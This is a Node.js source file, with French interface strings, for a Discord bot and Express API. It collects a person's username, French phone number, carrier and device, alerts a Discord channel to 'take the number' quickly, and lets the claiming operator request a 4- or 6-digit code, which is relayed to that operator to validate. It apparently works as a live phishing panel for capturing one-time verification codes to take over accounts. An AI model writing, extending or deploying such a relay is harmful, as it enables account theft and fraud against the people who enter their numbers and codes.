const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, ChannelType, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
const express = require('express');
const cors = require('cors');
const { v4: uuidv4 } = require('uuid');

const DISCORD_TOKEN    = process.env.DISCORD_TOKEN    || 'TON_TOKEN_ICI';
const ADMIN_CHANNEL_ID = process.env.ADMIN_CHANNEL_ID || '1570890792745304245';

const demandes = new Map();

const client = new Client({ intents: [
  GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages,
  GatewayIntentBits.MessageContent, GatewayIntentBits.GuildMembers
]});

client.once('ready', () => {
  console.log(`✅ Bot connecté : ${client.user.tag}`);
  client.user.setActivity('Réception des demandes', { type: 'WATCHING' });
});

client.on('interactionCreate', async (interaction) => {
  if (!interaction.isButton()) return;

  const args = interaction.customId.split(':');
  const action = args[0];
  const demandeId = args[args.length - 1]; 
  const demande = demandes.get(demandeId);
  
  if (!demande) return interaction.reply({ content: 'Ce dossier est terminé ou n\'existe plus.', ephemeral: true });

  // --- PRENDRE LA DEMANDE ---
  if (action === 'claim') {
    if (demande.claimed) return interaction.reply({ content: '❌ Déjà pris !', ephemeral: true });
    
    demande.claimed = true;
    demande.claimedBy = interaction.user.id;
    demandes.set(demandeId, demande);

    const embedPris = new EmbedBuilder()
      .setTitle(`⚡ NOUVELLE DEMANDE`)
      .setColor(0xFF6B00)
      .setDescription(`**Pris par ${interaction.user}**\n\n👤 **Pseudo :** \`${demande.username}\`\n📱 **Appareil :** \`${demande.device}\`\n🏢 **Opérateur :** \`${demande.operator}\`\n📞 **Numéro :** \`${demande.phone}\``);

    await interaction.update({ embeds: [embedPris], components: [] });

    const dossierEmbed = new EmbedBuilder()
      .setTitle('📁 FICHE DE VÉRIFICATION')
      .setColor(0x2b2d31)
      .addFields(
        { name: '👤 Pseudo', value: `\`\`\`\n${demande.username}\n\`\`\``, inline: false },
        { name: '📱 Appareil', value: `\`${demande.device}\``, inline: true },
        { name: '🏢 Opérateur', value: `\`${demande.operator}\``, inline: true },
        { name: '📞 Numéro', value: `\`\`\`\n+33 ${demande.phone}\n\`\`\``, inline: false }
      );

    const rowCode = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`setcode:4:${demandeId}`).setLabel('Code 4 Chiffres').setStyle(ButtonStyle.Success).setEmoji('📱'),
      new ButtonBuilder().setCustomId(`setcode:6:${demandeId}`).setLabel('Code 6 Chiffres').setStyle(ButtonStyle.Primary).setEmoji('🔢')
    );
    const rowActions = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`copynum:${demandeId}`).setLabel('Copier Numéro').setStyle(ButtonStyle.Secondary).setEmoji('📋'),
      new ButtonBuilder().setCustomId(`reject:${demandeId}`).setLabel('Rejeter').setStyle(ButtonStyle.Danger).setEmoji('❌')
    );

    try {
      await interaction.user.send({ embeds: [dossierEmbed], components: [rowCode, rowActions] });
      await interaction.followUp({ content: `✅ Dossier envoyé en message privé !`, ephemeral: true });
    } catch (e) {
      await interaction.followUp({ content: `❌ **Impossible de t'envoyer le dossier en MP.** Ouvre tes messages privés.`, ephemeral: true });
    }
  }

  if (action === 'copynum') return interaction.reply({ content: `\`${demande.phone}\``, ephemeral: true });

  if (action === 'setcode') {
    const length = parseInt(args[1]);
    demande.codeLength = length;
    demande.waitingForCode = true;
    demandes.set(demandeId, demande);
    await interaction.update({ content: `⏳ **En attente du code à ${length} chiffres...**`, embeds: [], components: [] });
  }

  if (action === 'badcode') {
    demande.waitingForCode = true;
    demandes.set(demandeId, demande);
    await interaction.update({ content: `⚠️ **Code invalide. Le client a été invité à réessayer.**`, embeds: [], components: [] });
  }

  if (action === 'accept') {
    demande.status = 'accepted';
    demandes.set(demandeId, demande);
    await interaction.update({ content: `✅ **Validé !**`, embeds: [], components: [] });
  }

  if (action === 'reject') {
    const modal = new ModalBuilder().setCustomId(`reject_modal:${demandeId}`).setTitle('Raison du rejet');
    const input = new TextInputBuilder().setCustomId('reason').setLabel('Message pour le client').setStyle(TextInputStyle.Paragraph).setPlaceholder('Ex: Faux numéro...').setRequired(true);
    modal.addComponents(new ActionRowBuilder().addComponents(input));
    await interaction.showModal(modal);
  }
});

client.on('interactionCreate', async (interaction) => {
  if (!interaction.isModalSubmit()) return;
  if (interaction.customId.startsWith('reject_modal:')) {
    const demandeId = interaction.customId.split(':')[1];
    const raison = interaction.fields.getTextInputValue('reason');
    const demande = demandes.get(demandeId);
    if (demande) { demande.status = 'rejected'; demande.rejectReason = raison; demandes.set(demandeId, demande); }
    await interaction.reply({ content: `❌ **Dossier rejeté.**\nMessage envoyé au client : *${raison}*`, ephemeral: true });
  }
});

const app = express();
app.use(cors());
app.use(express.json());

app.post('/api/demande', async (req, res) => {
  try {
    const { username, phone, operator, device } = req.body;
    const id = uuidv4();
    let formattedPhone = phone;
    if(phone.length === 10) formattedPhone = `${phone.slice(0,2)} ${phone.slice(2,4)} ${phone.slice(4,6)} ${phone.slice(6,8)} ${phone.slice(8,10)}`;

    const demande = { id, username, phone: formattedPhone, operator: operator, device: device || 'Inconnu', status: 'pending', claimed: false, waitingForCode: false };
    demandes.set(id, demande);

    const channel = await client.channels.fetch(ADMIN_CHANNEL_ID).catch(() => null);
    if (!channel) return res.status(500).json({ error: 'Salon introuvable' });

    const embedPublic = new EmbedBuilder()
      .setTitle(`⚡ NOUVELLE DEMANDE`)
      .setDescription(`Clique sur **Prendre le numéro**, fais vite !! 🚀`)
      .setColor(0xFF6B00);
      
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`claim:${id}`).setLabel('Prendre le numéro').setStyle(ButtonStyle.Primary).setEmoji('⚡')
    );

    const msg = await channel.send({ content: `@everyone`, embeds: [embedPublic], components: [row] });
    demande.publicMsgId = msg.id;
    demandes.set(id, demande);

    res.json({ success: true, demandeId: id });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/demande/:id/status', (req, res) => {
  const demande = demandes.get(req.params.id);
  if (!demande) return res.status(404).json({ error: 'Introuvable' });
  res.json({ status: demande.status, waitingForCode: demande.waitingForCode, codeLength: demande.codeLength || 4, rejectReason: demande.rejectReason || null });
});

app.post('/api/demande/:id/code', async (req, res) => {
  try {
    const { code } = req.body;
    const demande = demandes.get(req.params.id);
    if (!demande) return res.status(404).json({ error: 'Introuvable' });

    demande.waitingForCode = false;
    demande.code = code;
    demandes.set(demande.id, demande);

    const embedCode = new EmbedBuilder().setTitle('🔑 CODE REÇU').setColor(0x2b2d31)
      .addFields({ name: 'Code', value: `# **${code}**`, inline: false });
      
    const rowActions = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`accept:${demande.id}`).setLabel('Valider & Activer').setStyle(ButtonStyle.Success).setEmoji('✅'),
      new ButtonBuilder().setCustomId(`badcode:${demande.id}`).setLabel('Mauvais Code').setStyle(ButtonStyle.Danger).setEmoji('⚠️')
    );

    try {
      const user = await client.users.fetch(demande.claimedBy);
      await user.send({ embeds: [embedCode], components: [rowActions] });
    } catch(e) {}
    
    res.json({ success: true });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🌐 API sur port ${PORT}`));
client.login(DISCORD_TOKEN);